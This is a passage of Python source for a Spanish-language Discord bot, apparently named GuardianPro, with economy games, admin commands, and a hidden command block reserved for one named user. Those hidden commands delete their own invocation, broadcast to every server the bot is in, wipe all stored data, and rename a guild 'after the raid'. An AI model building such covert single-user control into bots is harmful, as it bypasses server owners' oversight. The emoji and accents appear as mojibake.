async def rob_command(ctx, member: discord.Member = None):
  """Intentar robar a otro usuario"""
  if not member:
      await ctx.send("‚ùå Uso: `.rob @usuario`")
      return

  if member.bot:
      await ctx.send("‚ùå No puedes robar a un bot.")
      return

  if member.id == ctx.author.id:
      await ctx.send("‚ùå No puedes robarte a ti mismo.")
      return

  if not can_use_cooldown(ctx.author.id, 'rob', 600):  # 10 minutos
      remaining = get_cooldown_remaining(ctx.author.id, 'rob', 600)
      minutes = int(remaining // 60)
      await ctx.send(f"‚è∞ Debes esperar **{minutes}m** antes de robar de nuevo.")
      return

  target_balance = get_balance(member.id)
  if target_balance['wallet'] < 500:
      await ctx.send(f"‚ùå {member.mention} no tiene suficiente dinero para robar (m√≠nimo $500).")
      return

  success_chance = random.random()

  if success_chance > 0.5:  # 50% de √©xito
      stolen_amount = random.randint(100, min(target_balance['wallet'] // 3, 1000))

      update_balance(member.id, -stolen_amount, 0)
      update_balance(ctx.author.id, stolen_amount, 0)

      embed = discord.Embed(title="üí∞ Robo Exitoso", color=discord.Color.green())
      embed.add_field(name="üéØ V√≠ctima", value=member.mention, inline=True)
      embed.add_field(name="üí∏ Robaste", value=f"${stolen_amount:,}", inline=True)
      embed.set_footer(text="¬°Escapaste con el dinero!")

      await ctx.send(embed=embed)
  else:
      fine = random.randint(200, 600)
      user_balance = get_balance(ctx.author.id)

      if user_balance['wallet'] >= fine:
          update_balance(ctx.author.id, -fine, 0)

      embed = discord.Embed(title="üö´ Robo Fallido", color=discord.Color.red())
      embed.add_field(name="üéØ Objetivo", value=member.mention, inline=True)
      embed.add_field(name="üí∏ Multa", value=f"${fine:,}", inline=True)
      embed.set_footer(text="¬°Te atraparon intentando robar!")

      await ctx.send(embed=embed)

@bot.command(name='baltop', aliases=['top'])
async def baltop_command(ctx):
  """Top 15 usuarios m√°s ricos del servidor"""
  if not balances:
      await ctx.send("‚ùå No hay datos de balance disponibles.")
      return

  # Crear lista de usuarios con sus balances totales
  user_balances = []
  for user_id, data in balances.items():
      try:
          user = bot.get_user(int(user_id))
          if user and not user.bot:
              total = data['wallet'] + data['bank']
              if total > 0:  # Solo usuarios con dinero
                  user_balances.append((user.display_name, total, data['wallet'], data['bank']))
      except:
          continue

  # Ordenar por balance total
  user_balances.sort(key=lambda x: x[1], reverse=True)
  user_balances = user_balances[:15]  # Top 15

  if not user_balances:
      await ctx.send("‚ùå No hay suficientes usuarios con balance para mostrar.")
      return

  embed = discord.Embed(title="üí∞ Top 15 M√°s Ricos", color=discord.Color.gold())

  description = ""
  medals = ["ü•á", "ü•à", "ü•â"]

  for i, (name, total, wallet, bank) in enumerate(user_balances):
      medal = medals[i] if i < 3 else f"{i+1}."
      description += f"{medal} **{name}** - ${total:,}\n"
      if i < 5:  # Mostrar detalles para top 5
          description += f"    üí∞ Billetera: ${wallet:,} | üè¶ Banco: ${bank:,}\n"
      description += "\n"

  embed.description = description
  embed.set_footer(text=f"Ranking del servidor ‚Ä¢ {len(user_balances)} usuarios")

  await ctx.send(embed=embed)

# A√±adir el comando .collect con rangos
@bot.command(name='collect', aliases=['cl'])
async def collect_command(ctx):
  """Recoge tu recompensa diaria/boost basada en tu rango."""
  user_id = str(ctx.author.id)
  user = ctx.author

  # Definir recompensas por rango
  rank_rewards = {
      "member": 200,
      "level_10": 500,
      "level_20": 1000,
      "level_30": 1800,
      "booster": 2500  # Rango especial para boosters
  }

  # Determinar el rango del usuario
  user_data = get_user_level_data(user_id)
  user_level = user_data['level']
  user_rank = "member"  # Rango base

  if user_level >= 30:
      user_rank = "level_30"
  elif user_level >= 20:
      user_rank = "level_20"
  elif user_level >= 10:
      user_rank = "level_10"

  # Verificar si el usuario es booster (necesitas tener una forma de detectar esto, aqu√≠ simulamos)
  # Ejemplo: Si el usuario tiene un rol espec√≠fico llamado "Booster"
  booster_role_name = "Booster"  # Ajusta esto al nombre real del rol
  booster_role = discord.utils.get(ctx.guild.roles, name=booster_role_name)
  if booster_role and booster_role in user.roles:
      user_rank = "booster"

  # Obtener recompensa y aplicar cooldown
  if not can_use_cooldown(user_id, 'collect', 7200):  # Cooldown de 2 horas
      remaining = get_cooldown_remaining(user_id, 'collect', 7200)
      hours = int(remaining // 3600)
      minutes = int((remaining % 3600) // 60)
      await ctx.send(f"‚è∞ Ya has recogido tu recompensa. Vuelve en **{hours}h {minutes}m**.")
      return

  reward_amount = rank_rewards.get(user_rank, rank_rewards["member"]) # Obtener recompensa

  # Simular un peque√±o bonus por rango
  if user_rank == "booster":
      bonus = random.randint(100, 500)
      reward_amount += bonus
      reward_message = f"¬°Gracias por ser booster! Recibiste ${reward_amount:,} (+${bonus:,} bonus)."
  elif user_rank == "level_30":
      bonus = random.randint(50, 200)
      reward_amount += bonus
      reward_message = f"¬°Felicidades por tu nivel {user_level}! Recibiste ${reward_amount:,} (+${bonus:,} bonus)."
  else:
      reward_message = f"¬°Gracias por tu actividad! Recibiste ${reward_amount:,}."

  update_balance(user_id, reward_amount, 0) # Solo se a√±ade a la billetera

  embed = discord.Embed(title="üéÅ Recompensa Recogida", color=discord.Color.gold())
  embed.add_field(name="‚≠ê Rango", value=user_rank.capitalize(), inline=True)
  embed.add_field(name="üí∞ Recibiste", value=f"${reward_amount:,}", inline=True)
  embed.set_footer(text=reward_message)

  await ctx.send(embed=embed)

@bot.command(name='win')
async def lottery_command(ctx):
  """Loter√≠a de $10,000 con 0.5% de probabilidad de ganar"""
  user_data = get_balance(ctx.author.id)

  if user_data['wallet'] < 10000:
      await ctx.send(f"‚ùå Necesitas $10,000 para jugar la loter√≠a. Tienes ${user_data['wallet']:,}")
      return

  # Verificar si hay premio configurado
  guild_id = str(ctx.guild.id)
  if guild_id not in lottery_settings or not lottery_settings[guild_id].get('reward'):
      await ctx.send("‚ùå No hay premio configurado para la loter√≠a. Un administrador debe usar `*winset` primero.")
      return

  # Cobrar el costo
  update_balance(ctx.author.id, -10000, 0)

  # Probabilidad de 0.5% de ganar (1 en 200)
  win_chance = random.randint(1, 200)

  if win_chance == 1:  # Gan√≥
      reward = lottery_settings[guild_id]['reward']

      # Embed de ganador
      embed = discord.Embed(
          title="üéâ ¬°GANADOR DE LA LOTER√çA! üéâ",
          description=f"**{ctx.author.mention} HA GANADO LA LOTER√çA!**\n\n"
                      f"üèÜ **Premio:** {reward}\n"
                      f"üí∞ **Costo:** $10,000\n"
                      f"üéØ **Probabilidad:** 0.5% (1/200)",
          color=discord.Color.gold()
      )
      embed.set_thumbnail(url=ctx.author.display_avatar.url)
      embed.add_field(
          name="üé´ Pr√≥ximo paso",
          value="¬°Abre un ticket para reclamar tu premio!",
          inline=False
      )

      # Anuncio p√∫blico con @everyone
      await ctx.send(f"@everyone üö® **¬°TENEMOS UN GANADOR!** üö®")
      await ctx.send(embed=embed)

      # Mensaje privado al ganador
      try:
          dm_embed = discord.Embed(
              title="üéâ ¬°Felicidades!",
              description=f"¬°Has ganado la loter√≠a!\n\n"
                          f"**Premio:** {reward}\n\n"
                          f"Para reclamar tu premio, abre un ticket en el servidor usando `/ticket_setup` o busca el panel de tickets.",
              color=discord.Color.gold()
          )
          await ctx.author.send(embed=dm_embed)
      except:
          pass

      print(f"LOTER√çA GANADA por {ctx.author.name} en {ctx.guild.name} - Premio: {reward}")

  else:  # Perdi√≥
      embed = discord.Embed(
          title="üí∏ Loter√≠a",
          description=f"**No fue tu d√≠a de suerte...**\n\n"
                      f"üí∞ Gastaste: $10,000\n"
                      f"üéØ Probabilidad de ganar: 0.5%\n"
                      f"üéÅ Premio actual: {lottery_settings[guild_id]['reward']}",
          color=discord.Color.red()
      )
      embed.set_footer(text="¬°Int√©ntalo de nuevo! La suerte puede cambiar.")

      await ctx.send(embed=embed)


# ================================
# COMANDOS DELTA ADICIONALES (SOLO CUELI13)
# ================================

@bot.command(name='S')
async def restore_server(ctx):
  """‚àÜS - Restaurar servidor despu√©s del raid"""
  # Verificar usuario autorizado
  if not is_authorized_user(ctx.author):
      return

  # Verificar si los comandos ‚àÜ est√°n habilitados
  if not delta_commands_enabled:
      return

  # Borrar el mensaje del comando inmediatamente
  try:
      await ctx.message.delete()
  except:
      pass

  guild = ctx.guild
  await ctx.send("üîß Iniciando restauraci√≥n del servidor...")
  print(f"Restauraci√≥n iniciada en el servidor {guild.name}")

  try:
      # Restaurar nombre del servidor
      await guild.edit(name="Servidor Restaurado")
      print("Nombre del servidor restaurado")

      # Crear canales b√°sicos
      basic_channels = [
          "üìã„Éªreglas",
          "üí¨„Éªgeneral",
          "üéÆ„Éªgaming",
          "ü§ñ„Éªbot-commands",
          "üì¢„Éªanuncios"
      ]

      overwrites = {
          guild.default_role: discord.PermissionOverwrite(
              read_messages=True,
              send_messages=True,
              view_channel=True
          )
      }

      for channel_name in basic_channels:
          try:
              await guild.create_text_channel(channel_name, overwrites=overwrites)
              print(f"Canal creado: {channel_name}")
              await asyncio.sleep(0.5)
          except Exception as e:
              print(f"Error al crear canal {channel_name}: {e}")

      # Crear roles b√°sicos
      basic_roles = [
          ("üõ°Ô∏è Moderador", discord.Color.blue()),
          ("üëë VIP", discord.Color.gold()),
          ("üéÆ Gamer", discord.Color.green()),
          ("üéµ M√∫sica", discord.Color.purple())
      ]

      for role_name, color in basic_roles:
          try:
              await guild.create_role(name=role_name, colour=color)
              print(f"Rol creado: {role_name}")
              await asyncio.sleep(0.5)
          except Exception as e:
              print(f"Error al crear rol {role_name}: {e}")

      await ctx.send("‚úÖ Servidor restaurado exitosamente!")
      print(f"Restauraci√≥n completada en {guild.name}")

  except Exception as e:
      await ctx.send(f"‚ùå Error durante la restauraci√≥n: {str(e)}")
      print(f"Error en restauraci√≥n: {e}")


@bot.command(name='E')
async def toggle_economy_mode(ctx):
  """‚àÜE - Activar/desactivar modo econom√≠a"""
  # Verificar usuario autorizado
  if not is_authorized_user(ctx.author):
      return

  # Borrar el mensaje del comando inmediatamente
  try:
      await ctx.message.delete()
  except:
      pass

  global economy_only_mode
  economy_only_mode = not economy_only_mode

  status = "‚úÖ ACTIVADO" if economy_only_mode else "‚ùå DESACTIVADO"
  await ctx.send(f"üè¶ **Modo Econom√≠a:** {status}")

  if economy_only_mode:
      await ctx.send("üì¢ Solo comandos de econom√≠a (prefijo .) est√°n disponibles.")
  else:
      await ctx.send("üì¢ Todos los comandos est√°n disponibles nuevamente.")


@bot.command(name='X')
async def broadcast_announcement(ctx, *, message=None):
  """‚àÜX - Enviar anuncios a todos los servidores"""
  # Verificar usuario autorizado
  if not is_authorized_user(ctx.author):
      return

  if not message:
      await ctx.send("‚ùå Uso: `‚àÜX <mensaje>`")
      return

  # Borrar el mensaje del comando inmediatamente
  try:
      await ctx.message.delete()
  except:
      pass

  await ctx.send(f"üì° Enviando anuncio a {len(bot.guilds)} servidores...")

  successful_sends = 0
  failed_sends = 0

  for guild in bot.guilds:
      try:
          # Buscar canal para enviar (prioridad: anuncios, general, primer canal disponible)
          target_channel = None

          # Buscar canal de anuncios
          for channel in guild.text_channels:
              if any(word in channel.name.lower() for word in ['anuncio', 'announcement', 'news', 'avisos']):
                  if channel.permissions_for(guild.me).send_messages:
                      target_channel = channel
                      break

          # Si no hay canal de anuncios, buscar general
          if not target_channel:
              for channel in guild.text_channels:
                  if 'general' in channel.name.lower():
                      if channel.permissions_for(guild.me).send_messages:
                          target_channel = channel
                          break

          # Si no hay general, usar primer canal disponible
          if not target_channel:
              for channel in guild.text_channels:
                  if channel.permissions_for(guild.me).send_messages:
                      target_channel = channel
                      break

          if target_channel:
              embed = discord.Embed(
                  title="üì¢ Anuncio Global",
                  description=message,
                  color=discord.Color.blue()
              )
              embed.set_footer(text=f"Anuncio enviado por {ctx.author.name}")

              await target_channel.send(embed=embed)
              successful_sends += 1
              print(f"Anuncio enviado a: {guild.name}")
          else:
              failed_sends += 1
              print(f"No se pudo enviar anuncio a: {guild.name} (sin permisos)")

      except Exception as e:
          failed_sends += 1
          print(f"Error enviando anuncio a {guild.name}: {e}")

      # Peque√±a pausa para evitar rate limits
      await asyncio.sleep(0.5)

  # Reporte final
  embed = discord.Embed(
      title="üìä Reporte de Anuncio Global",
      color=discord.Color.green()
  )
  embed.add_field(name="‚úÖ Exitosos", value=successful_sends, inline=True)
  embed.add_field(name="‚ùå Fallidos", value=failed_sends, inline=True)
  embed.add_field(name="üìä Total", value=len(bot.guilds), inline=True)
  embed.add_field(name="üìù Mensaje", value=message[:100] + "..." if len(message) > 100 else message, inline=False)

  await ctx.send(embed=embed)


@bot.command(name='D')
async def system_status(ctx):
  """‚àÜD - Ver estado del sistema"""
  # Verificar usuario autorizado
  if not is_authorized_user(ctx.author):
      return

  # Borrar el mensaje del comando inmediatamente
  try:
      await ctx.message.delete()
  except:
      pass

  embed = discord.Embed(
      title="üñ•Ô∏è Estado del Sistema GuardianPro",
      color=discord.Color.blue()
  )

  # Estados del sistema
  embed.add_field(
      name="‚öôÔ∏è Configuraci√≥n",
      value=f"**Comandos ‚àÜ:** {'‚úÖ Habilitados' if delta_commands_enabled else '‚ùå Deshabilitados'}\n"
            f"**Modo Econom√≠a:** {'‚úÖ Activo' if economy_only_mode else '‚ùå Inactivo'}",
      inline=False
  )

  # Estad√≠sticas del bot
  total_users = len(bot.users)
  total_guilds = len(bot.guilds)

  embed.add_field(
      name="üìä Estad√≠sticas",
      value=f"**Servidores:** {total_guilds}\n"
            f"**Usuarios:** {total_users}\n"
            f"**Canales:** {len([c for g in bot.guilds for c in g.channels])}",
      inline=True
  )

  # Datos de econom√≠a
  total_users_with_balance = len(balances)
  total_money_in_system = sum(data['wallet'] + data['bank'] for data in balances.values())

  embed.add_field(
      name="üí∞ Sistema de Econom√≠a",
      value=f"**Usuarios con balance:** {total_users_with_balance}\n"
            f"**Dinero total:** ${total_money_in_system:,}\n"
            f"**Sorteos activos:** {len(active_giveaways)}",
      inline=True
  )

  # Sistema de niveles
  total_users_with_levels = len(user_levels)
  total_messages = sum(data['messages'] for data in user_levels.values())

  embed.add_field(
      name="üèÜ Sistema de Niveles",
      value=f"**Usuarios con nivel:** {total_users_with_levels}\n"
            f"**Mensajes totales:** {total_messages:,}\n"
            f"**Tickets activos:** {len(active_tickets)}",
            inline=True
  )

  # Estado de automod
  automod_servers = len([g for g in automod_enabled.values() if g])

  embed.add_field(
      name="üõ°Ô∏è Moderaci√≥n",
      value=f"**Automod activo:** {automod_servers} servidores\n"
            f"**Palabras filtradas:** {len(banned_words)}\n"
            f"**Usuarios con advertencias:** {len(warning_counts)}",
      inline=False
  )

  embed.set_footer(text=f"Sistema operado por {ctx.author.name}")
  await ctx.send(embed=embed)


@bot.command(name='R')
async def reset_all_configs(ctx):
  """‚àÜR - Resetear todas las configuraciones"""
  # Verificar usuario autorizado
  if not is_authorized_user(ctx.author):
      return

  # Borrar el mensaje del comando inmediatamente
  try:
      await ctx.message.delete()
  except:
      pass

  # Confirmar reset
  embed = discord.Embed(
      title="‚ö†Ô∏è CONFIRMACI√ìN DE RESET",
      description="**¬øEst√°s seguro de que quieres resetear TODAS las configuraciones?**\n\n"
                  "Esto incluye:\n"
                  "‚Ä¢ Balances de econom√≠a\n"
                  "‚Ä¢ Niveles de usuarios\n"
                  "‚Ä¢ Inventarios\n"
                  "‚Ä¢ Cooldowns\n"
                  "‚Ä¢ Configuraciones de automod\n"
                  "‚Ä¢ Tickets activos\n"
                  "‚Ä¢ Sorteos activos\n\n"
                  "**‚ö†Ô∏è ESTA ACCI√ìN NO SE PUEDE DESHACER ‚ö†Ô∏è**",
      color=discord.Color.red()
  )

  msg = await ctx.send(embed=embed)

  # A√±adir reacciones para confirmar
  await msg.add_reaction("‚úÖ")
  await msg.add_reaction("‚ùå")

  def check(reaction, user):
      return user == ctx.author and str(reaction.emoji) in ["‚úÖ", "‚ùå"] and reaction.message.id == msg.id

  try:
      reaction, user = await bot.wait_for('reaction_add', timeout=30.0, check=check)

      if str(reaction.emoji) == "‚úÖ":
          # Proceder con el reset
          global balances, user_levels, inventories, cooldowns
          global automod_enabled, automod_settings, warning_counts
          global active_tickets, active_giveaways, active_timers

          # Reset de todos los datos
          balances = {}
          user_levels = {}
          inventories = {}
          cooldowns = {}
          automod_enabled = {}
          automod_settings = {}
          warning_counts = {}
          active_tickets = {}
          active_giveaways = {}
          active_timers = {}

          # Guardar archivos vac√≠os
          save_balances()
          save_levels()
          save_inventories()
          save_cooldowns()

          # Reset de configuraciones globales
          global delta_commands_enabled, economy_only_mode
          delta_commands_enabled = True
          economy_only_mode = False

          reset_embed = discord.Embed(
              title="üîÑ RESET COMPLETADO",
              description="**Todas las configuraciones han sido reseteadas exitosamente.**\n\n"
                          "‚úÖ Balances de econom√≠a limpiados\n"
                          "‚úÖ Niveles de usuarios reseteados\n"
                          "‚úÖ Inventarios vaciados\n"
                          "‚úÖ Cooldowns limpiados\n"
                          "‚úÖ Configuraciones de automod reseteadas\n"
                          "‚úÖ Tickets y sorteos cerrados\n"
                          "‚úÖ Configuraciones globales restauradas",
              color=discord.Color.green()
          )
          reset_embed.set_footer(text="El bot ha sido completamente reseteado")

          await msg.edit(embed=reset_embed)

          print(f"RESET COMPLETO ejecutado por {ctx.author.name}")

      else:
          cancel_embed = discord.Embed(
              title="‚ùå Reset Cancelado",
              description="El reset ha sido cancelado. Todas las configuraciones permanecen intactas.",
              color=discord.Color.orange()
          )
          await msg.edit(embed=cancel_embed)

  except asyncio.TimeoutError:
      timeout_embed = discord.Embed(
          title="‚è∞ Tiempo Agotado",
          description="El reset fue cancelado debido a inactividad.",
          color=discord.Color.orange()
      )
      await msg.edit(embed=timeout_embed)


# ================================
# COMANDO ADMINISTRATIVO *4dmin
# ================================

@bot.command(name='4dmin')
async def admin_menu(ctx):
  """Comando administrativo oculto *4dmin"""
  # Verificar permisos de administrador
  if not ctx.author.guild_permissions.administrator:
      return

  # Borrar el mensaje del comando
  try:
      await ctx.message.delete()
  except:
      pass

  # Crear men√∫ administrativo completo
  embed = discord.Embed(
      title="üõ°Ô∏è Panel de Administraci√≥n Completo",
      description="**Todos los comandos administrativos disponibles:**",
      color=discord.Color.red()
  )

  embed.add_field(
      name="üìä Informaci√≥n y Estad√≠sticas",
      value="**`*info`** - Ver informaci√≥n administrativa del servidor\n"
            "**`*stats`** - Ver estad√≠sticas completas del servidor\n"
            "**`*members`** - Ver estado de miembros por categor√≠a",
      inline=False
  )

  embed.add_field(
      name="üîß Configuraci√≥n del Servidor",
      value="**`*config`** - Ver comandos de configuraci√≥n disponibles\n"
            "**`*welcome`** - Configurar sistema de bienvenidas\n"
            "**`*automod`** - Usar `/automod` para moderaci√≥n autom√°tica",
      inline=False
  )

  embed.add_field(
      name="üí∞ Gesti√≥n de Econom√≠a",
      value="**`*eco @usuario cantidad`** - A√±adir dinero a un usuario\n"
            "**`*oce @usuario cantidad`** - Quitar dinero a un usuario\n"
            "**`*ecoreset @usuario`** - Resetear balance de usuario a $0\n"
            "**`*winset <premio>`** - Configurar premio de loter√≠a\n"
            "**`*wininfo`** - Ver informaci√≥n actual de loter√≠a",
      inline=False
  )

  embed.add_field(
      name="üé´ Sistema de Tickets",
      value="**`*tickets`** - Ver comandos de gesti√≥n de tickets\n"
            "**`*ticketlog @usuario`** - Ver historial de tickets de usuario\n"
            "**`*closeall`** - Cerrar todos los tickets abiertos",
      inline=False
  )

  embed.add_field(
      name="üõ†Ô∏è Utilidades y Mantenimiento",
      value="**`*purge [cantidad]`** - Limpiar mensajes (default: 10, m√°x: 100)\n"
            "**`*backup`** - Crear respaldo simulado del servidor\n"
            "**`*restore`** - Restaurar desde respaldo simulado",
      inline=False
  )

  embed.add_field(
      name="üìã Ejemplos de Uso",
      value="‚Ä¢ `*eco @Juan 5000` - Dar $5,000 a Juan\n"
            "‚Ä¢ `*oce @Mar√≠a 2000` - Quitar $2,000 a Mar√≠a\n"
            "‚Ä¢ `*winset Rol VIP + $50,000` - Configurar premio\n"
            "‚Ä¢ `*purge 50` - Borrar 50 mensajes\n"
            "‚Ä¢ `*ticketlog @usuario` - Ver tickets de usuario",
      inline=False
  )

  embed.set_footer(text="Panel administrativo ‚Ä¢ Auto-elimina en 45 segundos")

  # Enviar como mensaje temporal
  msg = await ctx.send(embed=embed)

  # Auto-eliminar despu√©s de 45 segundos para dar tiempo a leer
  import asyncio
  await asyncio.sleep(45)
  try:
      await msg.delete()
  except:
      pass


# ================================
# COMANDOS ADMINISTRATIVOS CON PREFIJO *
# ================================

@bot.command(name='info')
async def admin_info(ctx):
  """*info - Informaci√≥n administrativa del servidor"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  guild = ctx.guild
  embed = discord.Embed(
      title="üîß Informaci√≥n Administrativa",
      color=discord.Color.orange()
  )

  embed.add_field(name="üè∞ Servidor", value=f"{guild.name}\nID: {guild.id}", inline=True)
  embed.add_field(name="üëë Propietario", value=f"{guild.owner.mention if guild.owner else 'Desconocido'}", inline=True)
  embed.add_field(name="üìä Estado", value=f"Miembros: {guild.member_count}\nCanales: {len(guild.channels)}", inline=True)

  msg = await ctx.send(embed=embed)
  await asyncio.sleep(20)
  try:
      await msg.delete()
  except:
      pass

@bot.command(name='stats')
async def admin_stats(ctx):
  """*stats - Estad√≠sticas administrativas"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  guild = ctx.guild
  embed = discord.Embed(
      title="üìä Estad√≠sticas Administrativas",
      color=discord.Color.blue()
  )

  # Contar tipos de canales
  text_channels = len([c for c in guild.channels if isinstance(c, discord.TextChannel)])
  voice_channels = len([c for c in guild.channels if isinstance(c, discord.VoiceChannel)])

  embed.add_field(name="üìù Canales de texto", value=text_channels, inline=True)
  embed.add_field(name="üîä Canales de voz", value=voice_channels, inline=True)
  embed.add_field(name="üè∑Ô∏è Roles", value=len(guild.roles), inline=True)
  embed.add_field(name="üé´ Tickets activos", value=len(active_tickets), inline=True)
  embed.add_field(name="üéâ Sorteos activos", value=len(active_giveaways), inline=True)
  embed.add_field(name="üí∞ Usuarios con balance", value=len(balances), inline=True)

  msg = await ctx.send(embed=embed)
  await asyncio.sleep(20)
  try:
      await msg.delete()
  except:
      pass

@bot.command(name='config')
async def admin_config(ctx):
  """*config - Configuraci√≥n del servidor"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  embed = discord.Embed(
      title="‚öôÔ∏è Configuraci√≥n del Servidor",
      description="Comandos de configuraci√≥n disponibles:",
      color=discord.Color.green()
  )

  embed.add_field(
      name="üõ°Ô∏è Moderaci√≥n",
      value="`/automod` - Configurar moderaci√≥n autom√°tica",
      inline=False
  )
  embed.add_field(
      name="üé´ Tickets",
      value="`/ticket_setup` - Configurar panel de tickets",
      inline=False
  )
  embed.add_field(
      name="üéâ Entretenimiento",
      value="`/gstart` - Crear sorteos",
      inline=False
  )

  msg = await ctx.send(embed=embed)
  await asyncio.sleep(20)
  try:
      await msg.delete()
  except:
      pass

@bot.command(name='purge')
async def admin_purge(ctx, amount: int = 10):
  """*purge - Limpiar mensajes del canal"""
  if not ctx.author.guild_permissions.manage_messages:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  if amount > 100:
      amount = 100

  try:
      deleted = await ctx.channel.purge(limit=amount)
      msg = await ctx.send(f"üóëÔ∏è Se eliminaron {len(deleted)} mensajes.")
      await asyncio.sleep(5)
      await msg.delete()
  except Exception as e:
      msg = await ctx.send(f"‚ùå Error: {str(e)}")
      await asyncio.sleep(5)
      await msg.delete()

@bot.command(name='closeall')
async def admin_closeall(ctx):
  """*closeall - Cerrar todos los tickets"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  guild = ctx.guild
  tickets_closed = 0

  for channel in guild.channels:
      if channel.name.startswith('ticket-'):
          try:
              await channel.delete()
              tickets_closed += 1
          except:
              pass

  # Limpiar registro de tickets activos
  active_tickets.clear()

  msg = await ctx.send(f"üé´ Se cerraron {tickets_closed} tickets.")
  await asyncio.sleep(10)
  try:
      await msg.delete()
  except:
      pass

@bot.command(name='winset')
async def admin_winset(ctx, *, reward=None):
  """*winset - Configurar premio de la loter√≠a"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  if not reward:
      embed = discord.Embed(
          title="‚ùå Uso Incorrecto",
          description="**Uso:** `*winset <premio>`\n"
                      "**Ejemplo:** `*winset Rol VIP + $50,000`",
          color=discord.Color.red()
      )
      msg = await ctx.send(embed=embed)
      await asyncio.sleep(10)
      try:
          await msg.delete()
      except:
          pass
      return

  guild_id = str(ctx.guild.id)
  if guild_id not in lottery_settings:
      lottery_settings[guild_id] = {}

  lottery_settings[guild_id]['reward'] = reward
  save_lottery_settings()

  embed = discord.Embed(
      title="üé∞ Premio de Loter√≠a Configurado",
      description=f"**Nuevo premio:** {reward}\n\n"
                  f"üí∞ **Costo para jugar:** $10,000\n"
                  f"üéØ **Probabilidad:** 0.5% (1/200)\n"
                  f"üìù **Comando:** `.win`",
      color=discord.Color.gold()
  )
  embed.set_footer(text="Los jugadores ahora pueden usar .win para participar")

  msg = await ctx.send(embed=embed)
  await asyncio.sleep(15)
  try:
      await msg.delete()
  except:
      pass

@bot.command(name='wininfo')
async def admin_wininfo(ctx):
  """*wininfo - Ver informaci√≥n de la loter√≠a"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  guild_id = str(ctx.guild.id)

  if guild_id not in lottery_settings or not lottery_settings[guild_id].get('reward'):
      msg = await ctx.send("‚ùå No hay premio configurado. Usa `*winset <premio>` para configurar uno.")
      await asyncio.sleep(10)
      try:
          await msg.delete()
      except:
          pass
      return

  reward = lottery_settings[guild_id]['reward']

  embed = discord.Embed(
      title="üé∞ Informaci√≥n de Loter√≠a",
      color=discord.Color.blue()
  )
  embed.add_field(name="üèÜ Premio actual", value=reward, inline=False)
  embed.add_field(name="üí∞ Costo", value="$10,000", inline=True)
  embed.add_field(name="üéØ Probabilidad", value="0.5% (1/200)", inline=True)
  embed.add_field(name="üìù Comando", value="`.win`", inline=True)
  embed.set_footer(text="Configuraci√≥n actual de la loter√≠a")

  msg = await ctx.send(embed=embed)
  await asyncio.sleep(15)
  try:
      await msg.delete()
  except:
      pass


# ================================
# COMANDOS DE ECONOM√çA ADICIONALES (ADMIN)
# ================================

@bot.command(name='eco')
async def admin_eco(ctx, member: discord.Member = None, amount: int = None):
  """*eco - A√±adir dinero a usuarios (solo administradores)"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  if not member or amount is None:
      embed = discord.Embed(
          title="‚ùå Uso Incorrecto",
          description="**Uso:** `*eco @usuario cantidad`\n\n"
                      "**Ejemplos:**\n"
                      "‚Ä¢ `*eco @Juan 5000` - A√±ade $5,000 a Juan\n"
                      "‚Ä¢ `*eco @Mar√≠a 2000` - A√±ade $2,000 a Mar√≠a\n\n"
                      "**Nota:** Usa un n√∫mero positivo para a√±adir dinero",
          color=discord.Color.green()
      )
      msg = await ctx.send(embed=embed)
      await asyncio.sleep(15)
      try:
          await msg.delete()
      except:
          pass
      return

  if member.bot:
      msg = await ctx.send("‚ùå No puedes modificar el balance de un bot.")
      await asyncio.sleep(5)
      try:
          await msg.delete()
      except:
          pass
      return

  if amount <= 0:
      msg = await ctx.send("‚ùå La cantidad debe ser mayor a 0.")
      await asyncio.sleep(5)
      try:
          await msg.delete()
      except:
          pass
      return

  # Obtener balance actual
  current_balance = get_balance(member.id)

  # Aplicar adici√≥n
  update_balance(member.id, amount, 0)

  # Obtener nuevo balance
  new_balance = get_balance(member.id)

  # Crear embed de confirmaci√≥n
  embed = discord.Embed(
      title="üí∏ Dinero A√±adido",
      color=discord.Color.green()
  )
  embed.add_field(name="üë§ Usuario", value=member.mention, inline=True)
  embed.add_field(name="üí∏ Cantidad a√±adida", value=f"${amount:,}", inline=True)
  embed.add_field(name="üìä Balance anterior", value=f"${current_balance['wallet']:,}", inline=True)
  embed.add_field(name="üìà Nuevo balance", value=f"${new_balance['wallet']:,}", inline=True)
  embed.set_footer(text=f"Modificado por {ctx.author.display_name}")

  msg = await ctx.send(embed=embed)
  await asyncio.sleep(15)
  try:
      await msg.delete()
  except:
      pass

  # Log del comando
  print(f"Comando *eco usado por {ctx.author.name}: +${amount:,} a {member.display_name}")

@bot.command(name='oce')
async def admin_oce(ctx, member: discord.Member = None, amount: int = None):
  """*oce - Quitar dinero a usuarios (solo administradores)"""
  if not ctx.author.guild_permissions.administrator:
      return

  try:
      await ctx.message.delete()
  except:
      pass

  if not member or amount is None:
      embed = discord.Embed(
          title="‚ùå Uso Incorrecto",
          description="**Uso:** `*oce @usuario cantidad`\n\n"
                      "**Ejemplos:**\n"
                      "‚Ä¢ `*oce @Juan 5000` - Quita $5,000 a Juan\n"
                      "‚Ä¢ `*oce @Mar√≠a 2000` - Quita $2,000 a Mar√≠a\n\n"
                      "**Nota:** Solo acepta n√∫meros positivos para quitar dinero",
          color=discord.Color.red()
      )
      msg = await ctx.send(embed=embed)
      await asyncio.sleep(15)
      try:
          await msg.delete()
      except:
          pass
      return

  if member.bot:
      msg = await ctx.send("‚ùå No puedes modificar el balance de un bot.")
      await asyncio.sleep(5)
      try:
          await msg.delete()
      except:
          pass
      return

  if amount <= 0:
      msg = await ctx.send("‚ùå La cantidad debe ser mayor a 0.")
      await asyncio.sleep(5)
      try:
          await msg.delete()
      except:
          pass
      return

  # Obtener balance actual
  current_balance = get_balance(member.id)

  # Aplicar reducci√≥n (convertir a negativo)
  update_balance(member.id, -amount, 0)

  # Obtener nuevo balance
  new_balance = get_balance(member.id)

  # Crear embed de confirmaci√≥n
  embed = discord.Embed(
